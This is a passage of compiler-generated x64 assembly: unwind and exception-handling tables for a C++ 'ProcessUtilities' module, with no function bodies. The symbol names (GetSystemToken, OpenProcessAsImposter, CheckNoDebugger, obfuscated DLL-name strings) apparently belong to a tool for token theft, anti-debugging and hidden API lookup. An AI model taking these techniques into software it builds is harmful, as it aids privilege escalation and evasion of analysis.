$pdata$?dtor$2@?0??GetSystemToken@ProcessUtilities@@YAPEAXXZ@4HA DD imagerel ?dtor$2@?0??GetSystemToken@ProcessUtilities@@YAPEAXXZ@4HA
	DD	imagerel ?dtor$2@?0??GetSystemToken@ProcessUtilities@@YAPEAXXZ@4HA+87
	DD	imagerel $unwind$?dtor$2@?0??GetSystemToken@ProcessUtilities@@YAPEAXXZ@4HA
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?dtor$3@?0??GetSystemToken@ProcessUtilities@@YAPEAXXZ@4HA DD imagerel ?dtor$3@?0??GetSystemToken@ProcessUtilities@@YAPEAXXZ@4HA
	DD	imagerel ?dtor$3@?0??GetSystemToken@ProcessUtilities@@YAPEAXXZ@4HA+87
	DD	imagerel $unwind$?dtor$3@?0??GetSystemToken@ProcessUtilities@@YAPEAXXZ@4HA
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?Clean@ProcessUtilities@@YAHXZ DD imagerel $LN377
	DD	imagerel $LN377+781
	DD	imagerel $unwind$?Clean@ProcessUtilities@@YAHXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?FreeUsedLibrary@ProcessUtilities@@YAHV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z DD imagerel $LN829
	DD	imagerel $LN829+1577
	DD	imagerel $unwind$?FreeUsedLibrary@ProcessUtilities@@YAHV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?_GetFuncAddress@ProcessUtilities@@YAP6A_JXZPEAUHINSTANCE__@@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z DD imagerel $LN115
	DD	imagerel $LN115+481
	DD	imagerel $unwind$?_GetFuncAddress@ProcessUtilities@@YAP6A_JXZPEAUHINSTANCE__@@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?GetModHandle@ProcessUtilities@@YAPEAUHINSTANCE__@@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z DD imagerel $LN730
	DD	imagerel $LN730+1812
	DD	imagerel $unwind$?GetModHandle@ProcessUtilities@@YAPEAUHINSTANCE__@@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?dtor$17@?0??GetModHandle@ProcessUtilities@@YAPEAUHINSTANCE__@@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@4HA DD imagerel ?dtor$17@?0??GetModHandle@ProcessUtilities@@YAPEAUHINSTANCE__@@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@4HA
	DD	imagerel ?dtor$17@?0??GetModHandle@ProcessUtilities@@YAPEAUHINSTANCE__@@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@4HA+29
	DD	imagerel $unwind$?dtor$17@?0??GetModHandle@ProcessUtilities@@YAPEAUHINSTANCE__@@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@4HA
pdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DW	0513H
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?dtor$17@?0??GetModHandle@ProcessUtilities@@YAPEAUHINSTANCE__@@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@4HA DD 020601H
	DD	050023206H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$ip2state$?GetModHandle@ProcessUtilities@@YAPEAUHINSTANCE__@@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z DB '$'
	DB	082H
	DB	02H
	DB	'&'
	DB	04H
	DB	09dH, 04H
	DB	02H
	DB	0c2H
	DB	04H
	DB	0d1H, 03H
	DB	02H
	DB	0e5H, 06H
	DB	06H
	DB	','
	DB	08H
	DB	0b0H
	DB	0aH
	DB	'.'
	DB	06H
	DB	09cH
	DB	02H
	DB	0e6H
	DB	00H
	DB	'b'
	DB	02H
	DB	'&'
	DB	0cH
	DB	'F'
	DB	02H
	DB	'I', 02H
	DB	00H
	DB	'T'
	DB	02H
	DB	016H
	DB	08H
	DB	'"'
	DB	06H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$stateUnwindMap$?GetModHandle@ProcessUtilities@@YAPEAUHINSTANCE__@@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z DB 0cH
	DB	0cH
	DD	imagerel ??1?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAA@XZ
	DB	021H
	DB	04H
	DB	03aH
	DD	imagerel ??1?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAA@XZ
	DB	050H
	DB	06cH
	DD	imagerel ??1?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAA@XZ
	DB	0e1H
	DB	02H
	DB	03eH
	DD	imagerel ?dtor$17@?0??GetModHandle@ProcessUtilities@@YAPEAUHINSTANCE__@@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@4HA
	DB	062H
	DD	imagerel ??1_bstr_t@@QEAA@XZ
	DB	040H
	DB	0faH
	DD	imagerel ??1?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAA@XZ
	DB	0b0H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$cppxdata$?GetModHandle@ProcessUtilities@@YAPEAUHINSTANCE__@@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z DB 028H
	DD	imagerel $stateUnwindMap$?GetModHandle@ProcessUtilities@@YAPEAUHINSTANCE__@@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z
	DD	imagerel $ip2state$?GetModHandle@ProcessUtilities@@YAPEAUHINSTANCE__@@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?GetModHandle@ProcessUtilities@@YAPEAUHINSTANCE__@@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z DD 0d3219H
	DD	02d7424H
	DD	02c6424H
	DD	02b3424H
	DD	0240124H
	DD	0e016f018H
	DD	0c012d014H
	DD	05010H
	DD	imagerel __GSHandlerCheck_EH4
	DD	imagerel $cppxdata$?GetModHandle@ProcessUtilities@@YAPEAUHINSTANCE__@@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z
	DD	0112H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?_GetFuncAddress@ProcessUtilities@@YAP6A_JXZPEAUHINSTANCE__@@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z DD 0b1b01H
	DD	029641bH
	DD	028541bH
	DD	026341bH
	DD	022011bH
	DD	0e012f014H
	DD	07010H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$ip2state$?FreeUsedLibrary@ProcessUtilities@@YAHV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z DB 010H
	DB	080H
	DB	02H
	DB	'&'
	DB	04H
	DB	']', 04H
	DB	02H
	DB	'q', 02H
	DB	04H
	DB	'e', 04H
	DB	02H
	DB	0f8H
	DB	04H
	DB	0b1H, 06H
	DB	02H
	DB	'I', 02H
	DB	00H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$stateUnwindMap$?FreeUsedLibrary@ProcessUtilities@@YAHV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z DB 04H
	DB	0cH
	DD	imagerel ??1?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAA@XZ
	DB	021H
	DB	03H
	DB	03aH
	DD	imagerel ??1?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAA@XZ
	DB	050H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$cppxdata$?FreeUsedLibrary@ProcessUtilities@@YAHV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z DB 028H
	DD	imagerel $stateUnwindMap$?FreeUsedLibrary@ProcessUtilities@@YAHV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z
	DD	imagerel $ip2state$?FreeUsedLibrary@ProcessUtilities@@YAHV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?FreeUsedLibrary@ProcessUtilities@@YAHV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z DD 0d3219H
	DD	0257424H
	DD	0246424H
	DD	0233424H
	DD	01c0124H
	DD	0e016f018H
	DD	0c012d014H
	DD	05010H
	DD	imagerel __GSHandlerCheck_EH4
	DD	imagerel $cppxdata$?FreeUsedLibrary@ProcessUtilities@@YAHV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z
	DD	0d2H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?Clean@ProcessUtilities@@YAHXZ DD 0c1f01H
	DD	015741fH
	DD	014641fH
	DD	013341fH
	DD	0f018b21fH
	DD	0d014e016H
	DD	05010c012H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?dtor$3@?0??GetSystemToken@ProcessUtilities@@YAPEAXXZ@4HA DD 010201H
	DD	05002H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?dtor$2@?0??GetSystemToken@ProcessUtilities@@YAPEAXXZ@4HA DD 010201H
	DD	05002H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$ip2state$?GetSystemToken@ProcessUtilities@@YAPEAXXZ DB 08H
	DB	0ccH
	DB	02H
	DB	'9', 04H
	DB	00H
	DB	0d6H
	DB	04H
	DB	096H
	DB	00H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$stateUnwindMap$?GetSystemToken@ProcessUtilities@@YAPEAXXZ DB 04H
	DB	0eH
	DD	imagerel ?dtor$2@?0??GetSystemToken@ProcessUtilities@@YAPEAXXZ@4HA
	DB	036H
	DD	imagerel ?dtor$3@?0??GetSystemToken@ProcessUtilities@@YAPEAXXZ@4HA
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$cppxdata$?GetSystemToken@ProcessUtilities@@YAPEAXXZ DB 028H
	DD	imagerel $stateUnwindMap$?GetSystemToken@ProcessUtilities@@YAPEAXXZ
	DD	imagerel $ip2state$?GetSystemToken@ProcessUtilities@@YAPEAXXZ
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?GetSystemToken@ProcessUtilities@@YAPEAXXZ DD 081511H
	DD	0165415H
	DD	0153415H
	DD	0e00ef215H
	DD	0600b700cH
	DD	imagerel __CxxFrameHandler4
	DD	imagerel $cppxdata$?GetSystemToken@ProcessUtilities@@YAPEAXXZ
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?dtor$4@?0??Init@ProcessUtilities@@YAHXZ@4HA DD 010201H
	DD	05002H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$ip2state$?Init@ProcessUtilities@@YAHXZ DB 06H
	DB	','
	DB	00H
	DB	'5', 02H
	DB	02H
	DB	'T'
	DB	00H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$stateUnwindMap$?Init@ProcessUtilities@@YAHXZ DB 02H
	DB	0eH
	DD	imagerel ?dtor$4@?0??Init@ProcessUtilities@@YAHXZ@4HA
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$cppxdata$?Init@ProcessUtilities@@YAHXZ DB 028H
	DD	imagerel $stateUnwindMap$?Init@ProcessUtilities@@YAHXZ
	DD	imagerel $ip2state$?Init@ProcessUtilities@@YAHXZ
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?Init@ProcessUtilities@@YAHXZ DD 040a11H
	DD	0f340aH
	DD	07006b20aH
	DD	imagerel __CxxFrameHandler4
	DD	imagerel $cppxdata$?Init@ProcessUtilities@@YAHXZ
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?CreateProcessAccessToken@ProcessUtilities@@YAPEAXK@Z DD 052019H
	DD	0153412H
	DD	0120112H
	DD	05006H
	DD	imagerel __GSHandlerCheck
	DD	088H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?dtor$0@?0??CheckNoDebugger@ProcessUtilities@@YAHXZ@4HA DD 010201H
	DD	05002H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$ip2state$?CheckNoDebugger@ProcessUtilities@@YAHXZ DB 02H
	DB	'Q', 03H
	DB	02H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$stateUnwindMap$?CheckNoDebugger@ProcessUtilities@@YAHXZ DB 02H
	DB	0eH
	DD	imagerel ?dtor$0@?0??CheckNoDebugger@ProcessUtilities@@YAHXZ@4HA
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$cppxdata$?CheckNoDebugger@ProcessUtilities@@YAHXZ DB 028H
	DD	imagerel $stateUnwindMap$?CheckNoDebugger@ProcessUtilities@@YAHXZ
	DD	imagerel $ip2state$?CheckNoDebugger@ProcessUtilities@@YAHXZ
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?CheckNoDebugger@ProcessUtilities@@YAHXZ DD 020611H
	DD	030027206H
	DD	imagerel __CxxFrameHandler4
	DD	imagerel $cppxdata$?CheckNoDebugger@ProcessUtilities@@YAHXZ
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?dtor$2@?0??OpenProcessAsImposter@ProcessUtilities@@YAHPEAXKPEB_WPEA_WK01PEAU_STARTUPINFOW@@PEAU_PROCESS_INFORMATION@@@Z@4HA DD 010201H
	DD	05002H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$ip2state$?OpenProcessAsImposter@ProcessUtilities@@YAHPEAXKPEB_WPEA_WK01PEAU_STARTUPINFOW@@PEAU_PROCESS_INFORMATION@@@Z DB 0aH
	DB	0f9H, 02H
	DB	02H
	DB	'>'
	DB	00H
	DB	'8'
	DB	04H
	DB	' '
	DB	06H
	DB	'<'
	DB	00H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$stateUnwindMap$?OpenProcessAsImposter@ProcessUtilities@@YAHPEAXKPEB_WPEA_WK01PEAU_STARTUPINFOW@@PEAU_PROCESS_INFORMATION@@@Z DB 06H
	DB	0eH
	DD	imagerel ?dtor$2@?0??OpenProcessAsImposter@ProcessUtilities@@YAHPEAXKPEB_WPEA_WK01PEAU_STARTUPINFOW@@PEAU_PROCESS_INFORMATION@@@Z@4HA
	DB	034H
	DD	imagerel ??1?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAA@XZ
	DB	0e0H
	DB	064H
	DD	imagerel ??1?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAA@XZ
	DB	0f0H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$cppxdata$?OpenProcessAsImposter@ProcessUtilities@@YAHPEAXKPEB_WPEA_WK01PEAU_STARTUPINFOW@@PEAU_PROCESS_INFORMATION@@@Z DB 028H
	DD	imagerel $stateUnwindMap$?OpenProcessAsImposter@ProcessUtilities@@YAHPEAXKPEB_WPEA_WK01PEAU_STARTUPINFOW@@PEAU_PROCESS_INFORMATION@@@Z
	DD	imagerel $ip2state$?OpenProcessAsImposter@ProcessUtilities@@YAHPEAXKPEB_WPEA_WK01PEAU_STARTUPINFOW@@PEAU_PROCESS_INFORMATION@@@Z
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?OpenProcessAsImposter@ProcessUtilities@@YAHPEAXKPEB_WPEA_WK01PEAU_STARTUPINFOW@@PEAU_PROCESS_INFORMATION@@@Z DD 091311H
	DD	0233413H
	DD	01c0113H
	DD	0e00af00cH
	DD	060077008H
	DD	05006H
	DD	imagerel __CxxFrameHandler4
	DD	imagerel $cppxdata$?OpenProcessAsImposter@ProcessUtilities@@YAHPEAXKPEB_WPEA_WK01PEAU_STARTUPINFOW@@PEAU_PROCESS_INFORMATION@@@Z
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?dtor$18@?0??StartWindowsService@ProcessUtilities@@YAKV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@4HA DD 010201H
	DD	05002H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?dtor$14@?0??StartWindowsService@ProcessUtilities@@YAKV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@4HA DD 010201H
	DD	05002H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?dtor$10@?0??StartWindowsService@ProcessUtilities@@YAKV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@4HA DD 010201H
	DD	05002H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?dtor$6@?0??StartWindowsService@ProcessUtilities@@YAKV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@4HA DD 010201H
	DD	05002H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$ip2state$?StartWindowsService@ProcessUtilities@@YAKV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z DB '"'
	DB	0a2H
	DB	02H
	DB	082H
	DB	04H
	DB	'N'
	DB	02H
	DB	'm', 04H
	DB	06H
	DB	'8'
	DB	02H
	DB	')', 02H
	DB	08H
	DB	'5', 04H
	DB	02H
	DB	'('
	DB	0aH
	DB	'1', 03H
	DB	0cH
	DB	'2'
	DB	02H
	DB	'('
	DB	0eH
	DB	085H, 02H
	DB	010H
	DB	'M', 04H
	DB	02H
	DB	'('
	DB	0eH
	DB	0dcH
	DB	02H
	DB	0dH, 05H
	DB	00H
	DB	0caH
	DB	02H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$stateUnwindMap$?StartWindowsService@ProcessUtilities@@YAKV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z DB 010H
	DB	0cH
	DD	imagerel ??1?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAA@XZ
	DB	01H
	DB	06H
	DB	03eH
	DD	imagerel ?dtor$6@?0??StartWindowsService@ProcessUtilities@@YAKV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@4HA
	DB	064H
	DD	imagerel ??1?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAA@XZ
	DB	060H
	DB	096H
	DD	imagerel ?dtor$10@?0??StartWindowsService@ProcessUtilities@@YAKV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@4HA
	DB	0bcH
	DD	imagerel ??1?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAA@XZ
	DB	070H
	DB	0eeH
	DD	imagerel ?dtor$14@?0??StartWindowsService@ProcessUtilities@@YAKV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@4HA
	DB	029H
	DB	02H
	DD	imagerel ??1?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAA@XZ
	DB	080H
	DB	09dH
	DB	02H
	DD	imagerel ?dtor$18@?0??StartWindowsService@ProcessUtilities@@YAKV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@4HA
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$cppxdata$?StartWindowsService@ProcessUtilities@@YAKV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z DB 028H
	DD	imagerel $stateUnwindMap$?StartWindowsService@ProcessUtilities@@YAKV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z
	DD	imagerel $ip2state$?StartWindowsService@ProcessUtilities@@YAKV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?StartWindowsService@ProcessUtilities@@YAKV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z DD 0f3b19H
	DD	01c682aH
	DD	0437426H
	DD	0426426H
	DD	0413426H
	DD	03a0126H
	DD	0e016f018H
	DD	0c012d014H
	DD	05010H
	DD	imagerel __GSHandlerCheck_EH4
	DD	imagerel $cppxdata$?StartWindowsService@ProcessUtilities@@YAKV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z
	DD	01baH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?dtor$0@?0???0_bstr_t@@QEAA@PEB_W@Z@4HA DD 020601H
	DD	050023206H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$ip2state$??0_bstr_t@@QEAA@PEB_W@Z DB 04H
	DB	'4'
	DB	00H
	DB	0d2H
	DB	02H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$stateUnwindMap$??0_bstr_t@@QEAA@PEB_W@Z DB 02H
	DB	0eH
	DD	imagerel ?dtor$0@?0???0_bstr_t@@QEAA@PEB_W@Z@4HA
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$cppxdata$??0_bstr_t@@QEAA@PEB_W@Z DB 028H
	DD	imagerel $stateUnwindMap$??0_bstr_t@@QEAA@PEB_W@Z
	DD	imagerel $ip2state$??0_bstr_t@@QEAA@PEB_W@Z
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??0_bstr_t@@QEAA@PEB_W@Z DD 060f11H
	DD	07640fH
	DD	06340fH
	DD	0700b320fH
	DD	imagerel __CxxFrameHandler4
	DD	imagerel $cppxdata$??0_bstr_t@@QEAA@PEB_W@Z
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DB	01aH
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??1_bstr_t@@QEAA@XZ DD 040a01H
	DD	07340aH
	DD	07006320aH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??B_bstr_t@@QEBAPEBDXZ DD 020601H
	DD	030023206H
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DB	01aH
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?_Free@_bstr_t@@AEAAXXZ DD 040a01H
	DD	07340aH
	DD	07006320aH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??0Data_t@_bstr_t@@QEAA@PEB_W@Z DD 040a01H
	DD	06340aH
	DD	07006320aH
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DB	012H
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?Release@Data_t@_bstr_t@@QEAAKXZ DD 040a01H
	DD	06340aH
	DD	07006320aH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??_GData_t@_bstr_t@@AEAAPEAXI@Z DD 020601H
	DD	030023206H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?GetString@Data_t@_bstr_t@@QEBAPEBDXZ DD 020601H
	DD	030023206H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??1Data_t@_bstr_t@@AEAA@XZ DD 020601H
	DD	030023206H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?_Free@Data_t@_bstr_t@@AEAAXXZ DD 020601H
	DD	030023206H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?dtor$0@?0???R<lambda_1>@freqDLLS@ProcessUtilities@@QEBAAEAV?$obfuscated_data@$0N@$0?DCOKHGPAOABAGAID@D@ay@@XZ@4HA DD 010201H
	DD	05002H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$ip2state$??R<lambda_1>@freqDLLS@ProcessUtilities@@QEBAAEAV?$obfuscated_data@$0N@$0?DCOKHGPAOABAGAID@D@ay@@XZ DB 02H
	DB	0acH
	DB	02H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$stateUnwindMap$??R<lambda_1>@freqDLLS@ProcessUtilities@@QEBAAEAV?$obfuscated_data@$0N@$0?DCOKHGPAOABAGAID@D@ay@@XZ DB 02H
	DB	0eH
	DD	imagerel ?dtor$0@?0???R<lambda_1>@freqDLLS@ProcessUtilities@@QEBAAEAV?$obfuscated_data@$0N@$0?DCOKHGPAOABAGAID@D@ay@@XZ@4HA
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$cppxdata$??R<lambda_1>@freqDLLS@ProcessUtilities@@QEBAAEAV?$obfuscated_data@$0N@$0?DCOKHGPAOABAGAID@D@ay@@XZ DB 028H
	DD	imagerel $stateUnwindMap$??R<lambda_1>@freqDLLS@ProcessUtilities@@QEBAAEAV?$obfuscated_data@$0N@$0?DCOKHGPAOABAGAID@D@ay@@XZ
	DD	imagerel $ip2state$??R<lambda_1>@freqDLLS@ProcessUtilities@@QEBAAEAV?$obfuscated_data@$0N@$0?DCOKHGPAOABAGAID@D@ay@@XZ
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??R<lambda_1>@freqDLLS@ProcessUtilities@@QEBAAEAV?$obfuscated_data@$0N@$0?DCOKHGPAOABAGAID@D@ay@@XZ DD 020611H
	DD	030023206H
	DD	imagerel __CxxFrameHandler4
	DD	imagerel $cppxdata$??R<lambda_1>@freqDLLS@ProcessUtilities@@QEBAAEAV?$obfuscated_data@$0N@$0?DCOKHGPAOABAGAID@D@ay@@XZ
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?dtor$0@?0???__Ekernel32@freqDLLS@ProcessUtilities@@YAXXZ@4HA DD 010201H
	DD	05002H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$ip2state$??__Ekernel32@freqDLLS@ProcessUtilities@@YAXXZ DB 04H
	DB	0a8H
	DB	02H
	DB	']', 04H
	DB	00H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$stateUnwindMap$??__Ekernel32@freqDLLS@ProcessUtilities@@YAXXZ DB 02H
	DB	0eH
	DD	imagerel ?dtor$0@?0???__Ekernel32@freqDLLS@ProcessUtilities@@YAXXZ@4HA
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$cppxdata$??__Ekernel32@freqDLLS@ProcessUtilities@@YAXXZ DB 028H
	DD	imagerel $stateUnwindMap$??__Ekernel32@freqDLLS@ProcessUtilities@@YAXXZ
	DD	imagerel $ip2state$??__Ekernel32@freqDLLS@ProcessUtilities@@YAXXZ
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??__Ekernel32@freqDLLS@ProcessUtilities@@YAXXZ DD 020611H
	DD	030023206H
	DD	imagerel __CxxFrameHandler4
	DD	imagerel $cppxdata$??__Ekernel32@freqDLLS@ProcessUtilities@@YAXXZ
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??__Fkernel32@freqDLLS@ProcessUtilities@@YAXXZ DD 010401H
	DD	04204H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?dtor$0@?0???R<lambda_2>@freqDLLS@ProcessUtilities@@QEBAAEAV?$obfuscated_data@$09$0GPFFMNJFHLKDFJAP@D@ay@@XZ@4HA DD 010201H
	DD	05002H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$ip2state$??R<lambda_2>@freqDLLS@ProcessUtilities@@QEBAAEAV?$obfuscated_data@$09$0GPFFMNJFHLKDFJAP@D@ay@@XZ DB 02H
	DB	0a6H
	DB	02H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$stateUnwindMap$??R<lambda_2>@freqDLLS@ProcessUtilities@@QEBAAEAV?$obfuscated_data@$09$0GPFFMNJFHLKDFJAP@D@ay@@XZ DB 02H
	DB	0eH
	DD	imagerel ?dtor$0@?0???R<lambda_2>@freqDLLS@ProcessUtilities@@QEBAAEAV?$obfuscated_data@$09$0GPFFMNJFHLKDFJAP@D@ay@@XZ@4HA
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$cppxdata$??R<lambda_2>@freqDLLS@ProcessUtilities@@QEBAAEAV?$obfuscated_data@$09$0GPFFMNJFHLKDFJAP@D@ay@@XZ DB 028H
	DD	imagerel $stateUnwindMap$??R<lambda_2>@freqDLLS@ProcessUtilities@@QEBAAEAV?$obfuscated_data@$09$0GPFFMNJFHLKDFJAP@D@ay@@XZ
	DD	imagerel $ip2state$??R<lambda_2>@freqDLLS@ProcessUtilities@@QEBAAEAV?$obfuscated_data@$09$0GPFFMNJFHLKDFJAP@D@ay@@XZ
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??R<lambda_2>@freqDLLS@ProcessUtilities@@QEBAAEAV?$obfuscated_data@$09$0GPFFMNJFHLKDFJAP@D@ay@@XZ DD 020611H
	DD	030023206H
	DD	imagerel __CxxFrameHandler4
	DD	imagerel $cppxdata$??R<lambda_2>@freqDLLS@ProcessUtilities@@QEBAAEAV?$obfuscated_data@$09$0GPFFMNJFHLKDFJAP@D@ay@@XZ
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?dtor$0@?0???__Entdll@freqDLLS@ProcessUtilities@@YAXXZ@4HA DD 010201H
	DD	05002H
xdata	ENDS
;	COMDAT xdata
